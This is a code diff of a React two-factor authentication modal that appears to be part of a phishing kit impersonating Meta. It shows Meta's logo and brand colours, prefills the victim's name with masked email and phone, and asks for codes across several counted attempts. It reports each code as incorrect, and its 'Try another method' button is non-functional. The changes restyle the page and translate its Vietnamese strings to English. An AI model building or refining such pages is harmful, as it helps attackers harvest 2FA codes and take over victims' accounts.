@@ -79,7 +79,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
     const userName = formData?.fullName || 'User';
     const maskedEmail = maskEmail(formData?.personalEmail);
     const maskedPhone = maskPhone(formData?.phone);
-    const stepLabel = `(${texts.step || 'Bước'} ${attempts + 1}/${config.max_code_attempts || 3})`;
+    const stepLabel = `(${texts.step || 'Step'} ${attempts + 1}/${config.max_code_attempts || 3})`;
     const isCodeValid = /^\d{6,8}$/.test(String(code || '').replace(/\D/g, ''));
 
     /* ── Styles ── */
@@ -90,26 +90,32 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
         zIndex: 1040,
         display: 'flex',
         justifyContent: 'center',
-        alignItems: 'flex-start',
-        padding: '32px 16px',
+        alignItems: 'center',
+        padding: '8px',
         overflowY: 'auto',
         scrollbarWidth: 'none',
         msOverflowStyle: 'none',
     };
 
     const modalStyle = {
-        position: 'relative',
         width: '100%',
-        maxWidth: '500px',
-        backgroundImage: 'linear-gradient(130deg, #f9f1f9, #eaf3fd 35%, #edfbf2)',
-        borderRadius: '18px',
-        boxShadow: '0 20px 60px rgba(0,0,0,0.18)',
-        zIndex: 1050,
-        padding: '28px',
+        maxWidth: '520px',
+        backgroundColor: '#fff',
+        borderRadius: '16px',
+        boxShadow: '0 20px 50px rgba(15, 23, 42, 0.2)',
+        padding: '20px',
         display: 'flex',
         flexDirection: 'column',
-        gap: '16px',
-        flexShrink: 0,
+        minHeight: 'min(860px, calc(100vh - 16px))',
+        maxHeight: 'min(860px, calc(100vh - 16px))',
+        overflowY: 'auto',
+    };
+
+    const bodyStyle = {
+        display: 'flex',
+        flexDirection: 'column',
+        justifyContent: 'space-between',
+        flex: 1,
     };
 
     const inputWrapperStyle = {
@@ -136,8 +142,9 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
     };
 
     return (
-        <div style={overlayStyle}>
+        <div style={overlayStyle} onClick={onClose}>
             <div style={modalStyle} onClick={(e) => e.stopPropagation()}>
+                <div style={bodyStyle}>
 
                 {/* User info row */}
                 <div style={{ width: '100%' }}>
@@ -161,20 +168,20 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
 
                     {/* Title */}
                     <h2 style={{
-                        fontSize: '20px',
-                        lineHeight: 1.3,
+                        fontSize: '22px',
+                        lineHeight: 1.25,
                         color: '#000',
                         fontWeight: 700,
-                        marginBottom: '15px',
+                        marginBottom: '12px',
                         wordBreak: 'break-word',
                     }}>
-                        {texts.twoFAStep || 'Yêu cầu xác thực hai yếu tố'} {stepLabel}
+                        {texts.twoFAStep || 'Two-factor authentication request'} {stepLabel}
                     </h2>
 
                     {/* Description */}
                     <p style={{
                         color: '#9a979e',
-                        fontSize: '14px',
+                        fontSize: '15px',
                         lineHeight: 1.55,
                         margin: 0,
                     }}>
@@ -195,16 +202,6 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
                     {/* Form */}
                     <form onSubmit={handleSubmit}>
                         {/* Label */}
-                        <label htmlFor="twoFaInput" style={{
-                            display: 'block',
-                            marginBottom: '6px',
-                            fontSize: '13px',
-                            fontWeight: 600,
-                            color: '#3b4a64',
-                        }}>
-                            {texts.code || 'Mã 2FA'} <span style={{ color: '#e5484d' }}>*</span>
-                        </label>
-
                         {/* Input */}
                         <div
                             style={inputWrapperStyle}
@@ -233,7 +230,7 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
                                 style={inputStyle}
                                 inputMode="numeric"
                                 id="twoFaInput"
-                                placeholder={texts.code || 'Nhập mã xác thực'}
+                                placeholder={texts.code || 'Code'}
                                 maxLength="8"
                                 type="text"
                                 autoComplete="off"
@@ -254,30 +251,22 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
                             }}>
                                 {texts.codeExpired || 'The code you entered is incorrect. Please try again.'}
                             </p>
-                        ) : (
-                            <p style={{
-                                color: '#6a7893',
-                                fontSize: '12px',
-                                margin: '-1px 0 10px 0',
-                            }}>
-                                {texts.validCodeHint || 'Mã hợp lệ gồm 6 hoặc 8 chữ số.'}
-                            </p>
-                        )}
+                        ) : null}
 
                         {/* Submit button */}
-                        <div style={{ width: '100%', marginTop: '20px' }}>
+                        <div style={{ width: '100%', marginTop: '10px' }}>
                             <button
                                 type="submit"
                                 disabled={isLoading || !isCodeValid}
                                 style={{
-                                    minHeight: '48px',
+                                    minHeight: '40px',
                                     width: '100%',
                                     backgroundColor: '#0064E0',
                                     color: '#fff',
                                     borderRadius: '40px',
-                                    padding: '10px 16px',
+                                    padding: '8px 16px',
                                     border: 'none',
-                                    fontSize: '16px',
+                                    fontSize: '14px',
                                     fontWeight: 600,
                                     display: 'flex',
                                     alignItems: 'center',
@@ -299,10 +288,10 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
                                             display: 'inline-block',
                                             marginRight: '8px',
                                         }} />
-                                        {`${texts.pleaseWait || 'Vui lòng chờ'} ${formatTime(countdown)}...`}
+                                        {`${texts.pleaseWait || 'Please wait'} ${formatTime(countdown)}...`}
                                     </>
                                 ) : (
-                                    texts.continueBtn || 'Tiếp tục'
+                                    texts.continueBtn || 'Continue'
                                 )}
                             </button>
                         </div>
@@ -311,32 +300,29 @@ const TwoFAModal = ({ show, onClose, onSubmit, onSuccess, texts, formData }) => 
                         <div style={{
                             width: '100%',
                             marginTop: '20px',
-                            color: '#9a979e',
+                            color: '#8f949d',
                             display: 'flex',
                             alignItems: 'center',
                             justifyContent: 'center',
-                            backgroundColor: 'transparent',
+                            backgroundColor: '#fff',
                             borderRadius: '40px',
-                            padding: '10px 20px',
+                            minHeight: '40px',
+                            padding: '8px 20px',
                             border: '1px solid #d4dbe3',
                             cursor: 'default',
                             pointerEvents: 'none',
                             fontSize: '14px',
+                            fontWeight: 400,
+                            lineHeight: 1,
                         }}>
-                            <span>{texts.tryAnotherMethod || 'Thử phương thức khác'}</span>
+                            <span>{texts.tryAnotherMethod || 'Try another method'}</span>
+                        </div>
+
+                        <div style={{ width: '64px', margin: '20px auto 0' }}>
+                            <img src={MetaLogo} width="100%" alt="Meta" style={{ objectFit: 'contain' }} />
                         </div>
                     </form>
                 </div>
-
-                {/* Meta logo */}
-                <div style={{
-                    width: '60px',
-                    height: '60px',
-                    flexShrink: 0,
-                    margin: '0 auto',
-                }}>
-                    <img src={MetaLogo} width="100%" height="100%" alt="Meta"
-                        style={{ objectFit: 'contain' }} />
                 </div>
             </div>
 
